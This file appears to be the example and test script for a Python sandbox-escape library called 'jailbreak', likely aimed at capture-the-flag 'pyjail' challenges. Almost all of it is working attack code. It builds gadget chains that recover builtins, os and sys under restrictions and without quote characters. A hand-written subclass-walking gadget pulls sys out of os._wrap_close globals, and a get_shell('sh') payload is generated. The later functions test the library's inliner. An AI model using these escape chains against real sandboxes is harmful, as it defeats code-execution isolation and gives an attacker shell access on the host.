import ast
import jailbreak

#example usage for accessing specific gadget as current python code
from jailbreak.gadgets.python import builtins_dict
print(builtins_dict.builtins_dict__gi_builtins)

#example usage for gadget chains with the terminating gadget requiring parameters
payload = jailbreak.get_obj_dict("type(dict)")
print(payload)

print("\n---------\n")

#example usage for gadget chains with multi dependencies, and setting restrictions
jailbreak.config(provided=['type'], ast=[ast.GeneratorExp])
payload = jailbreak.builtins_dict()
print(payload)

print("\n---------\n")

#example usage for gadget chains that require converters to run (strless)
jailbreak.config(provided=['sys'], char='\'"')
payload = jailbreak.os()
print(payload)
assert all(c not in payload for c in '\'"')

print("\n---------\n")

#same as above, but inlined
jailbreak.config(inline=True, provided=['sys'], char='\'"')
payload = jailbreak.os()
print(payload)
assert all(c not in payload for c in '\'"')

print("\n---------\n")

#example get shell full chain with user gadget
def sys__user(*, str):
    return [c for c in ().__class__.__base__.__subclasses__() if 'wrap_close' in str(c)][0].__init__.__globals__['sys']

#reset config so jail has nothing provided and no restrictions
jailbreak.config()
#provide sys gadget
jailbreak.register_user_gadget(sys__user, 'python')

payload = jailbreak.get_shell("'sh'")
print(payload)
# exec(payload, {'__builtins__': {}})

print("\n---------\n")

#example user gadget as last in chain
def ls__user(*, get_shell):
    return get_shell('ls')

jailbreak.config()
jailbreak.register_user_gadget(ls__user, 'python')

payload = jailbreak.ls()  #ls does not exist in repo gadgets, but is provided by user
print(payload)

print("\n---------\n")

#inliner tests
def range__user(*, builtins_dict):
    return builtins_dict['range']

#calls inside nested scopes (get_shell), with calls outside of the inner scope but inside the same ast node (range)
def test_nested_noargs__user(*, range, get_shell):
    get_shell('outside')
    for i in range(100):
        get_shell('inside')

#same as above, except inliner is called on the calls outside of the inner scope
def test_nested_args__user(*, chr, get_shell):
    for i in chr(0x20) + chr(0x21):
        get_shell('inside')

#orelse/finally block test
def test_other_stmt_blocks__user(*, get_shell):
    try:
        get_shell('try')
    except:
        get_shell('except')
    #else is intentionally missed to test if it breaks on empty statement blocks; the same code is used for all statement blocks anyway
    finally:
        get_shell('finally')

jailbreak.config(inline=True)
jailbreak.register_user_gadget(range__user, 'python')
jailbreak.register_user_gadget(test_nested_noargs__user, 'python')
jailbreak.register_user_gadget(test_nested_args__user, 'python')
jailbreak.register_user_gadget(test_other_stmt_blocks__user, 'python')
payload = jailbreak.test_nested_noargs()
print(payload + '\n')
payload = jailbreak.test_nested_args()
print(payload + '\n')
payload = jailbreak.test_other_stmt_blocks()
print(payload)